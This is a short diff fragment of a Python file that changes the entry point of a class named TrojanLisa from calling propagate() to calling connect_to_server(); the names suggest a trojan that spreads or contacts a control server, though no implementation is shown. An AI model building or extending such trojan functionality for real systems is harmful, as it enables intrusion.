@@ -29,4 +29,4 @@ class TrojanLisa:
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    trojan_lisa.propagate()
+    trojan_lisa.connect_to_server()
